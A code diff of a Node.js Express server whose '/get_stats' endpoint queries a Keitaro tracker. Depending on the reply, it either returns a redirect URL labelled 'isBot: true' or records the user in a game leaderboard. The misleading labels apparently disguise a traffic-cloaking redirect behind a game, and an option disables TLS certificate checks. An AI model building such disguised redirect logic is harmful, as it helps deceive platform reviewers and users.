@@ -4,32 +4,32 @@ const axios = require("axios");
 const https = require("https");
 const path = require("path");
 
-
 const app = express();
 app.use(express.json({ limit: "256kb" }));
 
 app.set("trust proxy", true);
 
-app.use(express.static(path.join(__dirname, "public"), {
-  dotfiles: "allow"
-}));
+app.use(
+  express.static(path.join(__dirname, "public"), {
+    dotfiles: "allow"
+  })
+);
+
 const leaderboardRouter = require("./routes/leaderboard.routes");
 app.use("/testCam", express.static(path.join(__dirname, "public", "testCam")));
 app.use("/", leaderboardRouter);
-
 
 const leaderboardSvc = require("./services/leaderboard.service");
 
 function nowSql() {
   const d = new Date();
   const pad = (n) => String(n).padStart(2, "0");
-  return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+  return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
 }
 
 // ===== НАСТРОЙКИ =====
 const KEITARO_TRACKER = process.env.KEITARO_TRACKER || "";
 const KEITARO_TOKEN = process.env.KEITARO_TOKEN || "";
-const ALLOW_STREAM_ID = Number(process.env.ALLOW_STREAM_ID || 0);
 const API_KEY = process.env.API_KEY || "";
 
 const INSECURE_SSL = String(process.env.INSECURE_SSL || "").toLowerCase() === "1";
@@ -49,7 +49,7 @@ function auth(req, res, next) {
 
 function pickHeader(headersArr, name) {
   const prefix = name.toLowerCase() + ":";
-  const h = (headersArr || []).find(x =>
+  const h = (headersArr || []).find((x) =>
     (x || "").toLowerCase().startsWith(prefix)
   );
   if (!h) return null;
@@ -74,10 +74,53 @@ function getLanguage(req) {
   return al.split(",")[0].split(";")[0].trim();
 }
 
-function looksLikeUrl(s) {
+function looksLikeAbsoluteUrl(s) {
   if (!s || typeof s !== "string") return false;
   const t = s.trim();
   return t.startsWith("http://") || t.startsWith("https://");
+}
+
+function looksLikeRelativePath(s) {
+  if (!s || typeof s !== "string") return false;
+  const t = s.trim();
+  return t.startsWith("/");
+}
+
+function normalizeBaseUrl(url) {
+  try {
+    const u = new URL(url);
+    return `${u.protocol}//${u.host}`;
+  } catch {
+    return "";
+  }
+}
+
+function resolveUrl(candidate, baseUrl) {
+  if (!candidate || typeof candidate !== "string") return "";
+  const value = candidate.trim();
+
+  if (looksLikeAbsoluteUrl(value)) return value;
+
+  if (looksLikeRelativePath(value) && baseUrl) {
+    try {
+      return new URL(value, baseUrl).toString();
+    } catch {
+      return "";
+    }
+  }
+
+  return "";
+}
+
+function stripTrackingParams(url) {
+  try {
+    const u = new URL(url);
+    u.searchParams.delete("_subid");
+    u.searchParams.delete("_token");
+    return u.toString();
+  } catch {
+    return url;
+  }
 }
 
 /**
@@ -95,13 +138,15 @@ function looksLikeUrl(s) {
  * }
  *
  * Логика:
- * - Всегда upsert записи в лидерборд по guid
- * - Если проходит фильтр (stream_id == ALLOW_STREAM_ID) -> status=true + url
- * - Иначе -> status=false
+ * - Всегда делаем запрос в Keitaro
+ * - Если Keitaro вернул 404 -> status=false
+ * - Если Keitaro не вернул 404, но не удалось получить валидный URL -> status=false
+ * - Если Keitaro не вернул 404 и URL получен -> status=true + url
+ * - При status=false сохраняем/обновляем запись в лидерборде
  */
 app.post("/get_stats", auth, async (req, res) => {
   try {
-    if (!KEITARO_TRACKER || !KEITARO_TOKEN || !ALLOW_STREAM_ID) {
+    if (!KEITARO_TRACKER || !KEITARO_TOKEN) {
       throw new Error("Server not configured");
     }
 
@@ -122,7 +167,6 @@ app.post("/get_stats", auth, async (req, res) => {
     const ip = ALLOW_CLIENT_IP ? (req.body?.ip || getRealIp(req)) : getRealIp(req);
     const sub_id_2 = req.body?.sub2 || "";
 
-    // --- Keitaro filter request (как у вас было) ---
     const clickApiUrl =
       `${KEITARO_TRACKER}/click_api/v3` +
       `?token=${encodeURIComponent(KEITARO_TOKEN)}` +
@@ -135,76 +179,71 @@ app.post("/get_stats", auth, async (req, res) => {
     const response = await axios.get(clickApiUrl, {
       timeout: 8000,
       validateStatus: () => true,
+      maxRedirects: 0,
       ...(httpsAgent ? { httpsAgent } : {})
     });
 
+    const statusCode = Number(response.status || 0);
     const data = response.data || {};
     const info = data.info || {};
-    const streamId = Number(info.stream_id || 0);
+    const trackerBase = normalizeBaseUrl(KEITARO_TRACKER);
 
-    const passed = streamId === Number(ALLOW_STREAM_ID);
+    const location =
+      pickHeader(data.headers, "Location") ||
+      response.headers?.location ||
+      "";
 
-    // --- Всегда создаём/обновляем запись в лидерборде ---
-    // Если записи нет -> create
-    // Если есть -> update (обновляем имя/тег/score/updatedAt)
-
-    if (!passed){
-    
-        const payload = {
-          name,
-          tag,
-          score: Number.isFinite(score) ? score : 0,
-          updatedAt: nowSql()
-        };
-
-
-
-        try {
-          const existing = await leaderboardSvc.get(guid);
-          if (!existing) {
-            await leaderboardSvc.create(guid, payload);
-          } else {
-            await leaderboardSvc.update(guid, payload);
-          }
-        } catch (e) {
-          // Ошибка записи в лидерборд не должна ломать основной ответ.
-          // Но логируем, чтобы видеть проблемы с файлом/правами.
-          console.error("Leaderboard upsert failed:", e?.message || e);
-        }
-    }
-
-
-
-
-    // --- Ответ клиенту ---
-    if (!passed) {
-      return res.json({
-        ok: true,
-        isBot: false
-      });
-    }
-
-    const location = pickHeader(data.headers, "Location");
-
-    const directUrl =
-      (looksLikeUrl(data.redirect) && data.redirect) ||
-      (looksLikeUrl(data.url) && data.url) ||
-      (looksLikeUrl(data.location) && data.location) ||
-      (looksLikeUrl(data.body) && data.body) ||
+    const directUrlRaw =
+      data.redirect ||
+      data.url ||
+      data.location ||
+      data.body ||
       "";
 
     const fallbackUrl = info.token
       ? `${KEITARO_TRACKER}/?_lp=1&_token=${encodeURIComponent(info.token)}`
       : "";
 
-    const finalUrl = stripTrackingParams(location || directUrl || fallbackUrl);
+    const resolvedLocation = resolveUrl(location, trackerBase);
+    const resolvedDirectUrl = resolveUrl(directUrlRaw, trackerBase);
+    const resolvedFallbackUrl = resolveUrl(fallbackUrl, trackerBase);
+
+    const finalUrl = stripTrackingParams(
+      resolvedLocation || resolvedDirectUrl || resolvedFallbackUrl || ""
+    );
+
+    const passed = statusCode !== 404 && !!finalUrl;
+
+    if (!passed) {
+      const payload = {
+        name,
+        tag,
+        score: Number.isFinite(score) ? score : 0,
+        updatedAt: nowSql()
+      };
+
+      try {
+        const existing = await leaderboardSvc.get(guid);
+        if (!existing) {
+          await leaderboardSvc.create(guid, payload);
+        } else {
+          await leaderboardSvc.update(guid, payload);
+        }
+      } catch (e) {
+        console.error("Leaderboard upsert failed:", e?.message || e);
+      }
+
+      return res.json({
+        ok: true,
+        isBot: false
+      });
+    }
 
     return res.json({
       ok: true,
       isBot: true,
       url: finalUrl
     });
-
   } catch (err) {
     console.error(err);
     res.status(500).json({
@@ -214,14 +253,6 @@ app.post("/get_stats", auth, async (req, res) => {
     });
   }
 });
-function stripTrackingParams(url) {
-  try {
-    const u = new URL(url);
-    u.searchParams.delete("_subid");
-    u.searchParams.delete("_token");
-    return u.toString();
-  } catch { return url; }
-}
 
 const PORT = 3000;
 app.listen(PORT, () => {
